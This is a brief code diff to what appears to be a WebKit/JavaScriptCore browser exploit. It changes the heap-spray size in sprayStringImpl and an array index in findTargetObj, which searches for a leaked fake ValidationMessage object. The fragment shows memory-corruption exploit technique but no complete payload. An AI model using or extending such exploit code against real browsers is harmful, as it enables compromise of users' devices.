@@ -294,7 +294,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 4);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -363,7 +363,7 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
